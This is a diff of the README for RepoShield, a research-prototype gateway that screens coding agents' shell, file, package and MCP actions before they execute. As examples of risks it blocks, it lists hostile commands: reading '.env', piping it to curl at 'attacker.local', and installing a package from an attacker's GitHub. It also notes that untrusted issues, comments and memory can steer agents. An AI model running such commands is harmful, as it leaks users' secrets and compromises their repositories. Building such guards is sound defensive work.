@@ -1,6 +1,6 @@
 # RepoShield / PepoShield v0.3
 
-RepoShield is a governance gateway for coding agents. It sits between a real agent and the model API / tool execution path, then checks risky actions before they happen.
+RepoShield is a pre-execution governance gateway for coding agents. It sits in front of model API responses, tool calls, shell commands, file operations, MCP tools, and package-manager actions, then decides whether each action can run on the host, only in a sandbox, only after approval, or not at all.
 
 Short version:
 
@@ -8,20 +8,68 @@ Short version:
 RepoShield = a pre-execution safety gate for coding agents
 ```
 
-## What It Does
+## Current Status
 
-Coding agents can read repositories, edit files, run shell commands, install dependencies, call MCP tools, and sometimes touch CI/CD or release workflows. RepoShield protects that execution path from untrusted context such as GitHub issues, PR comments, README text, branch names, MCP output, package scripts, and model-generated tool calls.
+RepoShield is currently a **strengthened research prototype / early engineering MVP**.
 
-Typical risks it tries to catch:
+It is suitable for papers, demos, internal experiments, gateway interception studies, and limited local trials. It is not yet a production-ready commercial security product.
 
-- malicious dependency installs such as `npm install github:attacker/helper-tool`
-- direct secret reads such as `cat .env`
-- secret/network egress such as `curl http://attacker.local/leak`
+Approximate maturity:
+
+| Scenario | Current readiness |
+| --- | --- |
+| Paper demo / project showcase | 85% - 90% |
+| Internal research platform | 75% - 85% |
+| Small-team local trial | 55% - 65% |
+| Commercial security product | 30% - 40% |
+
+Latest local verification:
+
+```text
+python -m pytest --basetemp=.pytest_tmp -q   -> 77 passed
+python -m compileall -q src tests            -> passed
+ruff check src tests                         -> passed
+```
+
+## What It Protects
+
+Coding agents can read repositories, edit files, run shell commands, install packages, call MCP tools, and sometimes touch CI/CD or release workflows. RepoShield protects that path from untrusted context such as GitHub issues, PR comments, README text, branch names, MCP output, memory, package scripts, and model-generated tool calls.
+
+It is designed to catch risks such as:
+
+- malicious dependency installs, for example `npm install github:attacker/helper-tool`
+- direct secret reads, for example `cat .env`
+- secret/network egress, for example `cat .env | curl attacker.local`
 - CI workflow modification from untrusted context
-- package publish or force push attempts
-- suspicious shell wrappers or PowerShell encoded commands
+- package publish or force-push attempts
+- suspicious shell wrappers and PowerShell encoded commands
+- unsafe MCP tool calls or token passthrough
+- tainted memory authorizing high-risk actions
 
-## How It Integrates
+## Main Capabilities
+
+- OpenAI-compatible `/v1/chat/completions` gateway and minimal `/v1/responses` shape
+- Bearer-token gateway authentication
+- per-request `TaskContract`, `ContextGraph`, and `SecretSentry` isolation
+- unified decision semantics: `allow`, `allow_in_sandbox`, `sandbox_then_approval`, `block`
+- `guard_action_ir()` to govern already-lowered structured actions
+- OpenAI, Anthropic, Cline, OpenHands, and Aider parser mapping
+- transcript provenance with `SOURCE:`, JSONL actions, and `source_ids=...`
+- strict transcript mode that fail-closes unknown executable-looking lines
+- compound command lowering and per-part risk aggregation
+- canonicalized file paths with traversal and symlink checks
+- SecretSentry for secret reads, egress-after-secret, token-like output, and tainted file upload
+- PackageGuard with manager parsers, registry checks, lockfile evidence, and offline metadata/provenance oracle
+- MCPProxy and MemoryStore gates integrated into the control plane
+- sandbox / overlay / dry-run preflight with explicit isolation capability markers
+- policy rule trace, evidence refs, policy version, and runtime modes
+- ApprovalCenter / ApprovalStore with stable action hashes
+- thread-safe hash-chain audit log with schema versioning
+- replay evidence validation
+- Dashboard evidence chains
+- Stage2/Stage3 bench suites plus baseline/ablation report shape
+
+## Integration
 
 Recommended path: run RepoShield as an OpenAI-compatible gateway.
 
@@ -34,15 +82,7 @@ real agent
   -> safe response back to agent
 ```
 
-For agents that support an OpenAI-compatible `base_url`, point the agent at RepoShield:
-
-```text
-base_url = http://127.0.0.1:8765/v1
-api_key  = reposhield-local
-model    = gpt-4.1
-```
-
-Start RepoShield and forward to the real upstream:
+Start the gateway:
 
 ```bash
 export OPENAI_API_KEY=sk-...
@@ -54,132 +94,52 @@ PYTHONPATH=src python -m reposhield gateway-start \
   --upstream-base-url https://api.openai.com/v1
 ```
 
-Chinese docs are the most complete right now. Start with [README.zh-CN.md](README.zh-CN.md) and [Real Agent Integration](docs/REAL_AGENT_INTEGRATION.zh-CN.md).
-
-## Main Capabilities
-
-- OpenAI-compatible `/v1/chat/completions` and `/v1/responses` gateway
-- real OpenAI-compatible upstream forwarding
-- upstream SSE aggregation plus governed OpenAI-compatible SSE response mode for `stream=true`
-- `exec-guard` shell-command adapter for real agent tool wrapping
-- `file-guard` preflight checks for read/write/edit/delete operations
-- `init-agent` one-command repo bootstrap for Gateway + PATH shims
-- `approvals` CLI for persisted request/grant/deny events
-- minimal local HTML dashboard for audit and approval review
-- InstructionIR for model messages and tool calls
-- ActionIR for executable actions
-- task contract generation
-- source trust and taint tracking
-- policy decisions with `enforce`, `observe_only`, `warn`, and `disabled`
-- JSON/YAML policy override rules
-- package supply-chain guard
-- secret read and egress sentinel
-- sandbox / preflight API
-- approval request, grant, and JSONL persistence
-- hash-chain audit log and incident graph
-- Gateway Bench sample suite
-- HTML Studio report
-
-## Current Status
-
-This repository is a working MVP / research prototype, not a finished production security product.
-
-Good for:
-
-- local demos
-- small real-agent trials
-- gateway interception experiments
-- benchmark generation and evaluation
-- audit/report demonstrations
-
-Still needs production hardening:
-
-- token-by-token streaming passthrough with mid-stream tool-call governance
-- stronger sandbox isolation
-- deeper shell/script parsing
-- more dedicated adapters for specific agents
-- richer approval UI and team policy management
-- more bypass tests
-
-Current verification:
+Point your agent to:
 
 ```text
-pytest -q --basetemp .pytest_tmp -> 40 passed
+base_url = http://127.0.0.1:8765/v1
+api_key  = reposhield-local
+model    = gpt-4.1
 ```
 
-## Real Tool Guard
-
-For agents that can wrap their shell tool, use:
+For agents that can wrap their shell tool:
 
 ```bash
 PYTHONPATH=src python -m reposhield exec-guard \
   --repo ./your-repo \
   --task "fix login button and run tests" \
-  --source-file ./issue.md \
   -- npm test
 ```
 
-`exec-guard` runs RepoShield before execution. Blocked commands are not executed; `allow_in_sandbox` commands are preflighted instead of running directly on the host.
+## Decision Semantics
 
-## One-Command Agent Bootstrap
+| Decision | Meaning |
+| --- | --- |
+| `allow` | May run on the host |
+| `allow_in_sandbox` | May only run in sandbox / overlay / preflight, never directly on the host |
+| `sandbox_then_approval` | Do not execute; create or wait for approval |
+| `block` / `quarantine` | Do not execute |
 
-Generate repo-local config, instructions, and PATH shims:
+## Production Gap
 
-```bash
-PYTHONPATH=src python -m reposhield init-agent \
-  --repo ./your-repo \
-  --agent cline \
-  --task "fix login and run tests"
-```
+RepoShield is not yet commercial-ready. The largest remaining gaps are:
 
-This creates:
+- production-grade sandboxing with container/namespace/seccomp/eBPF/network monitoring
+- live package metadata, tarball inspection, Sigstore/provenance, and typosquatting checks
+- real agent trace collection and schema-drift compatibility tests
+- stable policy language, signed policies, tenant policy management, and approval APIs/UI
+- product-grade Studio/Dashboard with filtering, search, diff, trace graph, and policy debugging
+- larger benchmark set with real agent traces and measured false-positive/false-negative rates
 
-```text
-your-repo/.reposhield/config.json
-your-repo/.reposhield/agent-instructions.md
-your-repo/.reposhield/shims/{npm,git,curl,python}
-your-repo/.reposhield/shims/{npm,git,curl,python}.ps1
-```
-
-The shims route common shell tools through `reposhield exec-guard`.
-
-## Approvals, File Guard, Policy Config, Dashboard
-
-```bash
-PYTHONPATH=src python -m reposhield file-guard \
-  --repo ./your-repo \
-  --task "fix login and run tests" \
-  --operation edit \
-  --path .github/workflows/release.yml \
-  --source-file ./issue.md
-
-PYTHONPATH=src python -m reposhield approvals list \
-  --store ./your-repo/.reposhield/approvals.jsonl
-
-PYTHONPATH=src python -m reposhield dashboard \
-  --audit ./your-repo/.reposhield/audit.jsonl \
-  --approvals ./your-repo/.reposhield/approvals.jsonl \
-  --output ./your-repo/.reposhield/dashboard.html
-```
-
-Policy overrides can be supplied to `guard`, `exec-guard`, `file-guard`, `gateway-simulate`, and `gateway-start`:
-
-```yaml
-rules:
-  - name: block_ci_from_issue
-    match:
-      operation: edit
-      file_path: .github/workflows/release.yml
-    decision: block
-    reason: configured_ci_protection
-```
+See [Project Status and Commercialization Assessment](docs/PROJECT_STATUS.zh-CN.md) for the current roadmap.
 
 ## Documentation
 
-Recommended reading order:
+Chinese documentation is currently the most complete:
 
-1. [README.zh-CN.md](README.zh-CN.md)
-2. [Real Agent Integration](docs/REAL_AGENT_INTEGRATION.zh-CN.md)
-3. [Agent exec-guard recipes](docs/AGENT_EXEC_GUARD_RECIPES.zh-CN.md)
-4. [Documentation Map](docs/README.zh-CN.md)
-5. [Gateway Guide](docs/GATEWAY_GUIDE.zh-CN.md)
+1. [中文 README](README.zh-CN.md)
+2. [Project Status / 商用化评估](docs/PROJECT_STATUS.zh-CN.md)
+3. [Real Agent Integration](docs/REAL_AGENT_INTEGRATION.zh-CN.md)
+4. [Gateway Guide](docs/GATEWAY_GUIDE.zh-CN.md)
+5. [Agent exec-guard recipes](docs/AGENT_EXEC_GUARD_RECIPES.zh-CN.md)
+6. [Documentation Map](docs/README.zh-CN.md)
